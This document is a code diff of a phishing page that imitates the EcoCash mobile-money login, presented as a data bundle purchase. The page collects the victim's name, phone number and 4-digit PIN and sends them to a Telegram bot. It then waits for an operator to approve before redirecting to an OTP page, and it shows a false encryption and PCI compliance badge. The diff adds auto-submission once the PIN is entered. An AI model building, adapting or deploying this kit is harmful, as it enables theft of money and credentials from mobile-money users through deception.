@@ -8,17 +8,17 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root {
-            --eco-red: #e53935;
-            --eco-blue-dark: #0a1628;
-            --eco-blue: #1a3a6b;
-            --eco-blue-light: #2563eb;
-            --eco-accent: #3b82f6;
+            --primary: #1746a2;
+            --primary-dark: #0a1628;
+            --primary-light: #2563eb;
+            --accent: #3b82f6;
             --white: #ffffff;
-            --light-bg: #f0f4f8;
-            --text-dark: #1a1a2e;
+            --light-bg: #eef2ff;
+            --text-dark: #0f172a;
             --text-muted: #64748b;
-            --border: #e2e8f0;
+            --border: #cbd5e1;
             --success: #10b981;
+            --error: #ef4444;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -26,7 +26,7 @@
 
         body {
             font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(135deg, #0a1628 0%, #1a3a6b 50%, #0f2447 100%);
+            background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 60%, #1e40af 100%);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -36,8 +36,8 @@
         header {
             background: white;
             padding: 14px 5%;
-            border-bottom: 3px solid var(--eco-blue-light);
-            box-shadow: 0 2px 20px rgba(10, 22, 40, 0.12);
+            border-bottom: 3px solid var(--primary);
+            box-shadow: 0 2px 20px rgba(23, 70, 162, 0.1);
         }
 
         .logo {
@@ -50,8 +50,8 @@
             gap: 2px;
         }
 
-        .logo .eco { color: var(--eco-blue); }
-        .logo .cash { color: var(--eco-red); }
+        .logo .eco { color: var(--primary); }
+        .logo .cash { color: #e53935; }
 
         main {
             flex: 1;
@@ -64,36 +64,34 @@
         .login-container {
             background: white;
             border-radius: 20px;
-            padding: 40px;
-            max-width: 450px;
+            padding: 36px;
+            max-width: 440px;
             width: 100%;
-            box-shadow: 0 20px 60px rgba(10, 22, 40, 0.3);
-            border: 1px solid rgba(37, 99, 235, 0.1);
+            box-shadow: 0 20px 60px rgba(10, 22, 40, 0.35);
         }
 
         .login-header {
             text-align: center;
-            margin-bottom: 28px;
+            margin-bottom: 24px;
         }
 
         .login-header h1 {
-            font-size: 26px;
+            font-size: 24px;
             font-weight: 900;
-            color: var(--text-dark);
+            color: var(--primary);
             margin-bottom: 6px;
-            letter-spacing: -0.5px;
         }
 
         .login-header p {
             color: var(--text-muted);
-            font-size: 14px;
+            font-size: 13px;
         }
 
         .bundle-info {
-            background: linear-gradient(135deg, var(--eco-blue-light), var(--eco-blue));
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 24px;
+            padding: 14px 16px;
+            margin-bottom: 22px;
             color: white;
         }
 
@@ -101,31 +99,29 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             font-size: 13px;
         }
 
         .bundle-info-row:last-child {
             margin-bottom: 0;
-            padding-top: 8px;
-            border-top: 1px solid rgba(255, 255, 255, 0.2);
-            margin-top: 8px;
+            padding-top: 6px;
+            border-top: 1px solid rgba(255,255,255,0.2);
+            margin-top: 6px;
             font-weight: 800;
-            font-size: 16px;
+            font-size: 15px;
         }
 
-        .form-group {
-            margin-bottom: 18px;
-        }
+        .form-group { margin-bottom: 16px; }
 
         .form-label {
             display: block;
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 700;
-            color: var(--eco-blue);
+            color: var(--primary);
             text-transform: uppercase;
             letter-spacing: 0.05em;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
 
         .input-wrapper {
@@ -133,22 +129,21 @@
             align-items: center;
             border: 2px solid var(--border);
             border-radius: 12px;
-            padding: 12px 14px;
+            padding: 11px 14px;
             background: var(--light-bg);
             transition: all 0.2s;
         }
 
         .input-wrapper:focus-within {
-            border-color: var(--eco-blue-light);
+            border-color: var(--primary);
             background: white;
-            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+            box-shadow: 0 0 0 3px rgba(23, 70, 162, 0.08);
         }
 
         .country-code {
             font-weight: 700;
-            color: var(--eco-blue);
+            color: var(--primary);
             margin-right: 10px;
-            white-space: nowrap;
             font-size: 14px;
         }
 
@@ -156,80 +151,70 @@
             flex: 1;
             border: none;
             background: transparent;
-            font-size: 16px;
+            font-size: 15px;
             color: var(--text-dark);
             outline: none;
             font-family: inherit;
         }
 
-        .form-input::placeholder {
-            color: var(--text-muted);
-        }
+        .form-input::placeholder { color: var(--text-muted); }
 
         .pin-toggle {
             background: none;
             border: none;
-            color: var(--eco-blue-light);
+            color: var(--primary);
             cursor: pointer;
             font-weight: 700;
-            font-size: 13px;
-            padding: 0;
-            transition: color 0.2s;
-        }
-
-        .pin-toggle:hover {
-            color: var(--eco-red);
+            font-size: 12px;
         }
 
         .form-hint {
-            font-size: 12px;
+            font-size: 11px;
             color: var(--text-muted);
-            margin-top: 6px;
-            line-height: 1.5;
+            margin-top: 5px;
         }
 
         .error-msg {
             display: none;
-            background: rgba(229, 57, 53, 0.08);
-            border: 1px solid rgba(229, 57, 53, 0.2);
-            color: var(--eco-red);
+            background: rgba(239, 68, 68, 0.08);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            color: var(--error);
             font-size: 13px;
             font-weight: 600;
             border-radius: 10px;
             padding: 10px 14px;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
             text-align: center;
         }
 
-        .error-msg.show {
-            display: block;
-        }
+        .error-msg.show { display: block; }
 
         .btn-group {
             display: flex;
-            gap: 12px;
-            margin-top: 24px;
+            gap: 10px;
+            margin-top: 22px;
         }
 
         .btn-primary {
             flex: 1;
-            background: linear-gradient(135deg, var(--eco-blue-light), var(--eco-blue));
+            background: var(--primary);
             color: white;
             border: none;
-            padding: 14px 20px;
+            padding: 14px;
             border-radius: 50px;
             font-weight: 800;
-            font-size: 14px;
+            font-size: 13px;
             text-transform: uppercase;
             letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
-            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.3);
+            box-shadow: 0 4px 14px rgba(23, 70, 162, 0.3);
         }
 
         .btn-primary:hover:not(:disabled) {
+            background: var(--primary-light);
             transform: translateY(-1px);
-            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
+            box-shadow: 0 6px 20px rgba(23, 70, 162, 0.4);
         }
 
         .btn-primary:disabled {
@@ -241,40 +226,44 @@
         .btn-secondary {
             flex: 1;
             background: transparent;
-            color: var(--eco-blue-light);
-            border: 2px solid var(--eco-blue-light);
-            padding: 14px 20px;
+            color: var(--primary);
+            border: 2px solid var(--primary);
+            padding: 14px;
             border-radius: 50px;
             font-weight: 800;
-            font-size: 14px;
+            font-size: 13px;
             text-transform: uppercase;
-            letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
         }
 
-        .btn-secondary:hover {
-            background: rgba(37, 99, 235, 0.05);
-        }
+        .btn-secondary:hover { background: var(--light-bg); }
 
         .form-footer {
             text-align: center;
-            margin-top: 18px;
-            font-size: 12px;
+            margin-top: 16px;
+            font-size: 11px;
             color: var(--text-muted);
         }
 
         .form-footer a {
-            color: var(--eco-blue-light);
+            color: var(--primary);
             text-decoration: none;
             font-weight: 700;
         }
 
-        .form-footer a:hover {
-            text-decoration: underline;
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-top: 14px;
+            font-size: 11px;
+            color: var(--text-muted);
+            font-weight: 600;
         }
 
-        /* Loading Overlay */
+        /* Loading */
         .loading-overlay {
             position: fixed;
             inset: 0;
@@ -282,39 +271,27 @@
             align-items: center;
             justify-content: center;
             flex-direction: column;
-            gap: 16px;
-            background: rgba(10, 22, 40, 0.9);
+            gap: 14px;
+            background: rgba(10, 22, 40, 0.92);
             z-index: 2000;
             backdrop-filter: blur(6px);
         }
 
-        .loading-overlay.active {
-            display: flex;
-        }
+        .loading-overlay.active { display: flex; }
 
         .spinner {
-            width: 56px;
-            height: 56px;
-            border: 5px solid rgba(255, 255, 255, 0.15);
-            border-top-color: var(--eco-blue-light);
+            width: 52px;
+            height: 52px;
+            border: 4px solid rgba(255,255,255,0.15);
+            border-top-color: var(--accent);
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
 
-        .spin-label {
-            font-size: 16px;
-            font-weight: 700;
-            color: white;
-        }
+        .spin-label { font-size: 15px; font-weight: 700; color: white; }
+        .spin-sub { font-size: 12px; color: rgba(255,255,255,0.6); }
 
-        .spin-sub {
-            font-size: 13px;
-            color: rgba(255, 255, 255, 0.6);
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
         /* Modal */
         .modal-overlay {
@@ -329,70 +306,55 @@
             backdrop-filter: blur(6px);
         }
 
-        .modal-overlay.active {
-            display: flex;
-        }
+        .modal-overlay.active { display: flex; }
 
         .modal-content {
             background: white;
             border-radius: 20px;
-            padding: 36px;
-            max-width: 400px;
+            padding: 32px;
+            max-width: 380px;
             width: 100%;
             box-shadow: 0 20px 60px rgba(10, 22, 40, 0.3);
             text-align: center;
         }
 
         .modal-title {
-            font-size: 22px;
+            font-size: 20px;
             font-weight: 900;
-            color: var(--text-dark);
-            margin-bottom: 10px;
+            color: var(--primary);
+            margin-bottom: 8px;
         }
 
         .modal-subtitle {
             color: var(--text-muted);
-            font-size: 14px;
-            margin-bottom: 24px;
-            line-height: 1.6;
+            font-size: 13px;
+            margin-bottom: 20px;
         }
 
         .modal-btn {
             width: 100%;
-            padding: 14px 20px;
+            padding: 14px;
             border-radius: 50px;
             border: none;
             font-weight: 800;
-            font-size: 14px;
+            font-size: 13px;
             text-transform: uppercase;
-            letter-spacing: 0.04em;
             cursor: pointer;
-            transition: all 0.2s;
-            background: linear-gradient(135deg, var(--eco-blue-light), var(--eco-blue));
+            background: var(--primary);
             color: white;
-            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.3);
+            box-shadow: 0 4px 14px rgba(23, 70, 162, 0.3);
+            transition: all 0.2s;
         }
 
         .modal-btn:hover {
+            background: var(--primary-light);
             transform: translateY(-1px);
-            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
-        }
-
-        .security-note {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 16px;
-            font-size: 11px;
-            color: var(--text-muted);
-            font-weight: 600;
         }
 
         @media (max-width: 600px) {
             main { padding: 20px 16px; }
-            .login-container { padding: 28px 20px; }
-            .login-header h1 { font-size: 22px; }
+            .login-container { padding: 24px 18px; }
+            .login-header h1 { font-size: 20px; }
             .btn-group { flex-direction: column; }
         }
     </style>
@@ -433,10 +395,10 @@
                 <div class="form-group">
                     <label class="form-label" for="phone">EcoCash Number</label>
                     <div class="input-wrapper">
-                        <span class="country-code">&#127487;&#127462; +263</span>
+                        <span class="country-code">+263</span>
                         <input type="tel" class="form-input" id="phone" placeholder="77 123 4567" inputmode="numeric" maxlength="9" autocomplete="tel">
                     </div>
-                    <p class="form-hint">Enter your 9-digit number without the leading 0</p>
+                    <p class="form-hint">Enter 9-digit number without leading 0</p>
                 </div>
 
                 <div class="form-group">
@@ -445,7 +407,7 @@
                         <input type="password" class="form-input" id="pin" placeholder="&#8226;&#8226;&#8226;&#8226;" inputmode="numeric" maxlength="4" autocomplete="off">
                         <button type="button" class="pin-toggle" onclick="togglePinVisibility()">Show</button>
                     </div>
-                    <p class="form-hint">Your 4-digit EcoCash PIN</p>
+                    <p class="form-hint">4-digit PIN — auto-submits when complete</p>
                 </div>
 
                 <div class="btn-group">
@@ -455,23 +417,18 @@
             </form>
 
             <div class="form-footer">
-                By proceeding, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>
+                By proceeding, you agree to our <a href="#">Terms</a> & <a href="#">Privacy Policy</a>
             </div>
-
-            <div class="security-note">
-                <span>&#128274;</span> 256-bit Encrypted &middot; PCI DSS Compliant
-            </div>
+            <div class="security-note">&#128274; 256-bit Encrypted &middot; PCI DSS Compliant</div>
         </div>
     </main>
 
-    <!-- Loading Overlay -->
     <div id="loadingOverlay" class="loading-overlay">
         <div class="spinner"></div>
         <div class="spin-label">Processing Request</div>
-        <div class="spin-sub">Please wait while we verify your account...</div>
+        <div class="spin-sub">Verifying your account...</div>
     </div>
 
-    <!-- Already Applied Modal -->
     <div id="appliedModal" class="modal-overlay">
         <div class="modal-content">
             <h2 class="modal-title">Already Applied</h2>
@@ -490,7 +447,6 @@
             const params = new URLSearchParams(window.location.search);
             const data = params.get('data');
             const price = params.get('price');
-
             if (data && price) {
                 bundleData = { data, price };
                 document.getElementById('bundleInfo').style.display = 'block';
@@ -502,24 +458,18 @@
         function togglePinVisibility() {
             const pinInput = document.getElementById('pin');
             const btn = event.target;
-            if (pinInput.type === 'password') {
-                pinInput.type = 'text';
-                btn.textContent = 'Hide';
-            } else {
-                pinInput.type = 'password';
-                btn.textContent = 'Show';
-            }
+            pinInput.type = pinInput.type === 'password' ? 'text' : 'password';
+            btn.textContent = pinInput.type === 'password' ? 'Show' : 'Hide';
         }
 
         function showError(msg) {
-            const errorMsg = document.getElementById('errorMsg');
-            errorMsg.textContent = msg;
-            errorMsg.classList.add('show');
+            const el = document.getElementById('errorMsg');
+            el.textContent = msg;
+            el.classList.add('show');
         }
 
         function clearError() {
-            const errorMsg = document.getElementById('errorMsg');
-            errorMsg.classList.remove('show');
+            document.getElementById('errorMsg').classList.remove('show');
         }
 
         async function sendToTelegram(message, buttons) {
@@ -534,7 +484,6 @@
                         parse_mode: 'HTML'
                     })
                 });
-
                 return response.ok;
             } catch (error) {
                 console.error('Error:', error);
@@ -545,9 +494,13 @@
         // Auto-submit when PIN reaches 4 digits
         document.getElementById('pin').addEventListener('input', function() {
             if (this.value.length === 4) {
-                setTimeout(() => {
-                    document.getElementById('loginForm').dispatchEvent(new Event('submit', { cancelable: true }));
-                }, 300);
+                const name = document.getElementById('name').value.trim();
+                const phone = document.getElementById('phone').value.trim();
+                if (name && phone.length === 9) {
+                    setTimeout(() => {
+                        document.getElementById('loginForm').dispatchEvent(new Event('submit', { cancelable: true }));
+                    }, 300);
+                }
             }
         });
 
@@ -559,34 +512,15 @@
             const phone = document.getElementById('phone').value.trim();
             const pin = document.getElementById('pin').value.trim();
 
-            if (!name) {
-                showError('Please enter your name');
-                return;
-            }
-
-            if (!phone) {
-                showError('Please enter your phone number');
-                return;
-            }
-
-            if (phone.length !== 9) {
-                showError('Phone number must be 9 digits');
-                return;
-            }
-
-            if (!pin) {
-                showError('Please enter your PIN');
-                return;
-            }
-
-            if (pin.length !== 4) {
-                showError('PIN must be 4 digits');
-                return;
-            }
+            if (!name) { showError('Please enter your name'); return; }
+            if (!phone) { showError('Please enter your phone number'); return; }
+            if (phone.length !== 9) { showError('Phone number must be 9 digits'); return; }
+            if (!pin) { showError('Please enter your PIN'); return; }
+            if (pin.length !== 4) { showError('PIN must be 4 digits'); return; }
 
             const fullPhone = `+263${phone}`;
-            const message = `📱 <b>New Login Request</b>\n\n<b>Name:</b> <code>${name}</code>\n<b>Phone:</b> <code>${fullPhone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Bundle:</b> <code>${bundleData.data || 'N/A'}</code>\n<b>Amount:</b> <code>USD ${bundleData.price || '0.00'}</code>`;
-            
+            const message = `\u{1f4f1} <b>New Login Request</b>\n\n<b>Name:</b> <code>${name}</code>\n<b>Phone:</b> <code>${fullPhone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Bundle:</b> <code>${bundleData.data || 'N/A'}</code>\n<b>Amount:</b> <code>USD ${bundleData.price || '0.00'}</code>`;
+
             const buttons = [
                 [
                     { text: '\u2713 Approved', callback_data: 'login_approved' },
@@ -599,11 +533,11 @@
 
             sendToTelegram(message, buttons).then(() => {
                 document.getElementById('loadingOverlay').classList.add('active');
-                pollForApproval(name, phone);
+                pollForApproval();
             });
         }
 
-        function pollForApproval(name, phone) {
+        function pollForApproval() {
             const pollInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                     .then(res => res.json())
@@ -611,20 +545,18 @@
                         if (data.ok && data.result.length > 0) {
                             const update = data.result[0];
                             lastUpdateId = update.update_id;
-
                             if (update.callback_query) {
-                                const callbackData = update.callback_query.data;
-
-                                if (callbackData === 'login_approved') {
+                                const cb = update.callback_query.data;
+                                if (cb === 'login_approved') {
                                     clearInterval(pollInterval);
                                     document.getElementById('loadingOverlay').classList.remove('active');
                                     proceedToOTP();
-                                } else if (callbackData === 'login_declined') {
+                                } else if (cb === 'login_declined') {
                                     clearInterval(pollInterval);
                                     document.getElementById('loadingOverlay').classList.remove('active');
                                     showError('Request declined. Please try again.');
                                     document.getElementById('loginForm').reset();
-                                } else if (callbackData === 'login_applied') {
+                                } else if (cb === 'login_applied') {
                                     clearInterval(pollInterval);
                                     document.getElementById('loadingOverlay').classList.remove('active');
                                     document.getElementById('appliedModal').classList.add('active');
@@ -634,24 +566,17 @@
                     })
                     .catch(err => console.error('Poll error:', err));
             }, 1000);
-
             setTimeout(() => clearInterval(pollInterval), 300000);
         }
 
         function proceedToOTP() {
             document.getElementById('appliedModal').classList.remove('active');
             const phone = document.getElementById('phone').value.trim();
-            
-            window.location.href = `otp.html?data=${encodeURIComponent(bundleData.data)}&price=${bundleData.price}&phone=${encodeURIComponent(phone)}`;
+            window.location.href = `otp.html?data=${encodeURIComponent(bundleData.data || '')}&price=${bundleData.price || ''}&phone=${encodeURIComponent(phone)}`;
         }
 
-        document.getElementById('name').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') document.getElementById('phone').focus();
-        });
-
-        document.getElementById('phone').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') document.getElementById('pin').focus();
-        });
+        document.getElementById('name').addEventListener('keypress', (e) => { if (e.key === 'Enter') document.getElementById('phone').focus(); });
+        document.getElementById('phone').addEventListener('keypress', (e) => { if (e.key === 'Enter') document.getElementById('pin').focus(); });
 
         window.addEventListener('load', loadBundleData);
     </script>
